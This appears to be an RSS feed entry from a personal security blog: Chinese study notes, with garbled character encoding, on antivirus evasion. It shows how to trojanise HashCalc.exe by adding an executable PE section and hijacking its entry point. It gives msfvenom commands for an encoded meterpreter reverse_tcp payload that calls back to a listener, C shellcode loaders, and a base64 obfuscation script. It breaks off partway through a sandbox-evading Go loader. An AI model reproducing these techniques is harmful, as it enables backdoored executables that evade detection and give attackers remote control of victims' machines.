<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NOTES&amp;SUMMARY on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/notessummary/</link><description>Recent content in NOTES&amp;SUMMARY on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 26 Apr 2022 23:42:54 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/notessummary/index.xml" rel="self" type="application/rss+xml"/><item><title>å…æ€å­¦ä¹ ç¬”è®°â… </title><link>https://amiaaaz.github.io/2022/04/26/bypass-av-study-notes-01/</link><pubDate>Tue, 26 Apr 2022 23:42:54 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/26/bypass-av-study-notes-01/</guid><description>&lt;h2 id="shellcodeæ³¨å…¥">shellcodeæ³¨å…¥&lt;/h2>
&lt;p>&lt;a href="https://github.com/NetSPI/PESecurity">PESecurity&lt;/a>å¯ä»¥æ£€æµ‹ç›®æ ‡å¯¹è±¡æ˜¯å¦å¼€å¯ASLRç­‰å®‰å…¨é€‰é¡¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Import-Module&lt;/span> &lt;span style="color:#111">.\&lt;/span>&lt;span style="color:#111">Get-PESecurity&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">psm1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Get-PESecurity&lt;/span> &lt;span style="color:#f92672">-file&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#111">signle&lt;/span> &lt;span style="color:#111">file&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Get-PESecurity&lt;/span> &lt;span style="color:#111">-directory&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#111">directory&lt;/span> &lt;span style="color:#111">path&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">DLLs&lt;/span> &lt;span style="color:#111">&amp;amp;&lt;/span> &lt;span style="color:#111">EXEs&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407150555253.png" alt="image-20220407150555253">&lt;/p>
&lt;p>é€‰æ‹©ç›®æ ‡å¯¹è±¡çš„æ ‡å‡†ï¼š&lt;/p>
&lt;ul>
&lt;li>å¤§å°&amp;lt;10mbï¼Œåˆ©äºä¼ è¾“&lt;/li>
&lt;li>æœ¬èº«ä¸ºå¤§ä¼—æ–‡ä»¶ï¼Œä¾¿äºéšè”½&lt;/li>
&lt;li>ä¸å—ASLRæˆ–DEPç­‰å®‰å…¨åŠŸèƒ½çš„ä¿æŠ¤&lt;/li>
&lt;li>æœ€å¥½æœ¬èº«æœ‰ä½¿ç”¨ç½‘ç»œé€šä¿¡çš„åˆæ³•åŠŸèƒ½&lt;/li>
&lt;/ul>
&lt;p>è¿™é‡Œé€‰æ‹©çš„æ˜¯HashCalc.exe&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407152820447.png" alt="image-20220407152820447">&lt;/p>
&lt;ol>
&lt;li>é¦–å…ˆåœ¨åœ¨ä»£ç åŒºæ®µä¸­åˆ›å»ºæ–°çš„èŠ‚å¤´ï¼Œæˆ–åœ¨å†…å­˜ä¸­æ‰¾åˆ°åˆé€‚çš„ä½ç½®æ¤å…¥æˆ‘ä»¬çš„shellcode&lt;/li>
&lt;/ol>
&lt;p>ç”¨&lt;a href="https://down.52pojie.cn/Tools/PEtools/LordPE.7z">Lord PE&lt;/a>æ‰“å¼€ç›®æ ‡ç¨‹åºï¼Œå¹¶åœ¨åŒºæ®µè¡¨åº•éƒ¨æ·»åŠ æ–°æ®µ.ameï¼Œå¹¶å°†VSizeå’ŒRSizeéƒ½å¢åŠ 0x1000ï¼ˆ4096å­—èŠ‚ï¼‰ï¼Œå¹¶è®¾ç½®å¯è¯»å¯å†™å¯æ‰§è¡Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407153429603.png" alt="image-20220407153429603">&lt;/p>
&lt;p>æ­¤æ—¶ç›´æ¥è¿è¡Œä¼šå¤±è´¥ï¼Œå› ä¸ºæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ª1000hå­—èŠ‚çš„æ–°æ®µï¼Œä½†æ˜¯è¯¥åŒºæ®µä¸ºç©º&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407153503852.png" alt="image-20220407153503852">&lt;/p>
&lt;p>å…ˆç®€å•å¡«å……1000ä¸ª0x00çœ‹ç¨‹åºæ˜¯å¦æ­£å¸¸è¿è¡Œï¼Œè¿™é‡Œç”¨çš„æ˜¯&lt;a href="https://mh-nexus.de/downloads/HxDSetup.zip">HxD&lt;/a>ï¼ˆæ³¨æ„è¦å¡«å……åˆ°æ–‡ä»¶æœ«å°¾ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407154451061.png" alt="image-20220407154451061">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407155458815.png" alt="image-20220407155458815">&lt;/p>
&lt;p>å¯ä»¥æ­£å¸¸è¿è¡Œ&lt;/p>
&lt;ol start="2">
&lt;li>åŠ«æŒç¨‹åºæ‰§è¡Œæµç¨‹&lt;/li>
&lt;/ol>
&lt;p>é¦–å…ˆåœ¨&lt;a href="https://down.52pojie.cn/Tools/Debuggers/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E4%B8%93%E7%94%A8%E7%89%88Ollydbg.rar">Ollydbg&lt;/a>ä¸­è½¬åˆ°å†…å­˜éƒ¨åˆ†ï¼ˆalt+Mï¼‰ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ–°åŠ çš„.ameï¼Œå¹¶ä¸”æœ‰RWEæƒé™&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407160456405.png" alt="image-20220407160456405">&lt;/p>
&lt;p>æ¥ä¸‹æ¥æˆ‘ä»¬è¦å°†ç¨‹åºçš„æ‰§è¡ŒæµåŠ«æŒåˆ°æˆ‘ä»¬æ–°æ·»åŠ çš„.ameæ®µä¸­ï¼Œä½¿æœ€ç»ˆæ‰§è¡Œç¨‹åºæ—¶è¿›å…¥æ”¾æœ‰shellcodeçš„.ameéƒ¨åˆ†&lt;/p>
&lt;p>é¦–å…ˆå¤åˆ¶å‰3ä¸ªæ“ä½œç ï¼ˆä¹‹åå›å¤æ‰§è¡Œæµç¨‹æ—¶éœ€è¦ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407164119652.png" alt="image-20220407164119652">&lt;/p>
&lt;p>æˆ‘ä»¬å¤åˆ¶.ameçš„èµ·å§‹åœ°å€00482000ï¼Œå¹¶æŠŠç¨‹åºå…¥å£å¤„çš„&lt;code>push ebp&lt;/code>æ”¹ä¸º&lt;code>jmp 00482000&lt;/code>å¹¶ä¿å­˜ä¸ºæ–°çš„exe&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407165720185.png" alt="image-20220407165720185">&lt;/p>
&lt;p>å†æ¬¡è¿è¡Œæ—¶å°±å·²ç»ä¸ä¼šå±•ç¤ºæ­£å¸¸çš„é¡µé¢äº†&lt;/p>
&lt;ol start="3">
&lt;li>å¡«å……msfğŸ&lt;/li>
&lt;/ol>
&lt;p>è¿™é‡Œç”¨messageboxåšå¡«å……&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/messagebox &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;it&amp;#39;s demo&amp;#34;&lt;/span> -f hex
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨&lt;code>jmp 00482000&lt;/code>å¤„enterè·Ÿéšè·³è½¬ï¼ŒæŠŠpayloadå¤åˆ¶åˆ°nullçš„éƒ¨åˆ†ï¼Œä¿å­˜ä¸ºæ–°çš„exe&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407170518230.png" alt="image-20220407170518230">&lt;/p>
&lt;p>æˆåŠŸè¿è¡Œ&lt;/p>
&lt;ol start="4">
&lt;li>å›å¤ç¨‹åºçš„æ­£å¸¸æ‰§è¡Œæµç¨‹&lt;/li>
&lt;/ol>
&lt;p>é¦–å…ˆå°†shellcodeæœ€åä¸€å¥è·³è½¬æ”¹ä¸ºnopï¼Œä½¿ç”¨&lt;code>popfd&lt;/code>å’Œ&lt;code>popod&lt;/code>å›å¤å †æ ˆæ“ä½œï¼Œç„¶åå°†åŸç¨‹åºèµ·å§‹ä½ç½®çš„æ±‡ç¼–ç å¤åˆ¶åˆ°è¿™é‡Œï¼Œæœ€åè·³è½¬å›åŸæ¥çš„æ‰§è¡Œåœ°å€&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407180451897.png" alt="image-20220407180451897">&lt;/p>
&lt;p>å°±å¯ä»¥åœ¨å¼¹messageboxä¹‹åç»§ç»­HashCalcåŸç¨‹åºäº†&lt;/p>
&lt;p>åŒç†ï¼Œæˆ‘ä»¬å¯ä»¥æ’å…¥msfğŸ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i &lt;span style="color:#ae81ff">4&lt;/span> -b &lt;span style="color:#d88200">&amp;#39;\x00&amp;#39;&lt;/span> &lt;span style="color:#111">lhost&lt;/span>&lt;span style="color:#f92672">=&lt;/span>192.168.31.29 &lt;span style="color:#111">lport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">4788&lt;/span> -f hex
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„æ­¤å¤„é€‰ç”¨&lt;code>x86/shikata_ga_nai&lt;/code>çš„encoderä¹‹åå‰é¢å°±ä¸èƒ½ç”¨x64äº†ï¼Œé»˜è®¤ç”Ÿæˆçš„éƒ½æ˜¯x86çš„payloadï¼Œå¹¶ä¸”è¦æ³¨æ„&lt;code>-i&lt;/code>å‚æ•°çš„æŒ‡å®šï¼Œè¦ä¸å‰é¢æ‰©å……çš„æ–°æ®µå¤§å°ç›¸åŒ¹é…&lt;/p>
&lt;h2 id="shellcodeåŠ è½½å™¨">shellcodeåŠ è½½å™¨&lt;/h2>
&lt;blockquote>
&lt;/blockquote>
&lt;p>æ ¹æ®å‰é¢å¯¹ğŸç»“æ„çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“å•ä¸€çš„shellcodeæ˜¯æ— æ³•æ‰§è¡Œçš„ï¼Œéœ€è¦é…å¥—çš„shellcode loaderæ¥æ¥æ”¶åç»­çš„stagerï¼Œç¼–å†™çš„æ€è·¯éƒ½æ˜¯å¤§å·®ä¸å·®çš„ï¼Œä»¥åŠ¨æ€åŠ è½½å†…å­˜ä¸ºä¾‹ï¼š&lt;/p>
&lt;ol>
&lt;li>æ¥æ”¶4å­—èŠ‚ç¼“å†²åŒºå¤§å°&lt;/li>
&lt;li>å¼€è¾Ÿå†…å­˜&lt;/li>
&lt;li>å°†socketä¸­çš„å€¼å¤åˆ¶åˆ°ç¼“å†²åŒºä¸­å»&lt;/li>
&lt;li>è¯»å–å­—èŠ‚åˆ°ç¼“å†²åŒº&lt;/li>
&lt;li>æ‰§è¡Œsyscall&lt;/li>
&lt;li>é€€å‡º&lt;/li>
&lt;/ol>
&lt;p>è¿™æ˜¯æœ€æœ€æœ€åŸºç¡€çš„loaderï¼Œå½“è€ƒè™‘åˆ°å…æ€æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ä¸åŒçš„è¯­è¨€æ¥ç¼–è¯‘exeï¼ˆæ¯”å¦‚python, goç­‰ï¼‰ã€æ¶ˆé™¤ä»£ç ä¸­çš„æ˜æ˜¾ç‰¹å¾ï¼Œæˆ–æ˜¯ä¸ºæ¥æ”¶payloadè¿™ä¸€è¡Œä¸ºå‰åŠ ä¸Šæ²™ç›’ä¸­æ— æ³•å®ç°çš„æ¡ä»¶æ¥bypass&lt;/p>
&lt;p>ä¸‹é¢ä»¥cçš„ç‰ˆæœ¬åšä¸»è¦çš„ç¤ºä¾‹ï¼šï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># äº²æµ‹è¿™ä¸ªencoderå®Œå…¨ä¸èƒ½ç”¨åˆ°windows/x64/xxxä¸Š ä¹‹åç¼–è¯‘exeä¹Ÿå¾—ç”¨`gcc -m32 x.c -o x.exe` å¿…é¡»é…å¥—32ä½&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># è¿™æ ·äº§ç”Ÿçš„shellcodeæœ¬ä½“å¯ä»¥åšåˆ°åŸºæœ¬å…æ€ åç»­çš„æ“ä½œåŸºäºå¦‚ä½•å…æ€åŠ è½½&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i &lt;span style="color:#ae81ff">4&lt;/span> -b &lt;span style="color:#d88200">&amp;#39;\x00&amp;#39;&lt;/span> &lt;span style="color:#111">lhost&lt;/span>&lt;span style="color:#f92672">=&lt;/span>192.168.31.29 &lt;span style="color:#111">lport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">4788&lt;/span> -f c -o t1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="c">C&lt;/h3>
&lt;h4 id="ä¸è€ƒè™‘loaderçš„è£¸æ‰§è¡Œå¿…è¢«æ€">ä¸è€ƒè™‘loaderçš„è£¸æ‰§è¡Œï¼ˆå¿…è¢«æ€&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">[]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ç”³è¯·åŠ¨æ€å†…å­˜åŠ è½½">ç”³è¯·åŠ¨æ€å†…å­˜åŠ è½½&lt;/h4>
&lt;p>é€šå¸¸ä¼šè°ƒç”¨kernel32çš„win apiï¼Œå¸¸è§å‡½æ•°å’Œå®ƒä»¬çš„ä½œç”¨ï¼ˆä»¥cä¸ºä¾‹ï¼‰&lt;/p>
&lt;pre tabindex="0">&lt;code>malloc: åˆ†é…å†…å­˜
VirtualAlloc: ç”³è¯·ä¸€å—å¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŠ¨æ€å†…å­˜åŒºåŸŸ
memcpy: ä»æŒ‡å®šå†…å­˜ä¸­å¤åˆ¶å†…å®¹è‡³å¦ä¸€å†…å­˜é‡Œ
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LPVOID&lt;/span> &lt;span style="color:#111">Memory&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Memory&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">VirtualAlloc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">sizeof&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">MEM_COMMIT&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#111">MEM_RESERVE&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">PAGE_EXECUTE_READWRITE&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å†…å­˜åœ°å€, å¤§å°, åˆ†é…ç±»å‹, è¯¥å†…å­˜çš„åˆå§‹ä¿æŠ¤å±æ€§
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">memcpy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Memory&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">sizeof&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">)())&lt;/span>&lt;span style="color:#111">Memory&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="å†…è”æ±‡ç¼–æŒ‡ä»¤">å†…è”æ±‡ç¼–æŒ‡ä»¤&lt;/h4>
&lt;p>*æ³¨æ„gccçš„å†…è”æ±‡ç¼–ä¸vcçš„ä¸åŒ ä½¿ç”¨AT&amp;amp;Tè¯­æ³•ï¼Œè¯·å‚ç…§&lt;a href="https://www.jianshu.com/p/1782e14a0766">GCCå†…è”æ±‡ç¼–åŸºç¡€&lt;/a>&lt;/p>
&lt;h3 id="go">Go&lt;/h3>
&lt;p>é€šè¿‡&lt;code>syscall&lt;/code>å¯ä»¥ä¸æ»‘åœ°è°ƒç”¨kernel32.dllçš„å‡½æ•°&lt;/p>
&lt;h4 id="æ¡ä»¶è§¦å‘">æ¡ä»¶è§¦å‘&lt;/h4>
&lt;p>é¦–å…ˆå¯¹shellcodeè¿›è¡Œç®€æ˜“æ··æ·†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># https://github.com/pureqh/bypassAV/blob/main/go_shellcode_encode.py&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">buf1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;shellcode&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">b64shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">b64shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">b64shellcode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;#&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;H&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;@&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;T&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">b64shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é‡Œæ¡ä»¶è§¦å‘ï¼ŒæŒ‡çš„æ˜¯åœ¨æœ€åæŒ‡ä»¤æ‰§è¡Œå‰ å…ˆè®¿é—®ä¸€æ¬¡å±€åŸŸç½‘å†…å­˜åœ¨è€Œæ²™ç®±å†…ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œè¾¾åˆ°bypassæ²™ç®±çš„æ•ˆæœ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// https://github.com/pureqh/bypassAV/blob/main/main.go
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;encoding/base64&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/url&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;syscall&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;unsafe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">kernel32&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">syscall&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewLazyDLL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;kernel32.dll&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">VirtualAlloc&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">kernel32&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewProc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;VirtualAlloc&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">RtlMoveMemory&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">kernel32&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewProc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;RtlMoveMemory&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ddm&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
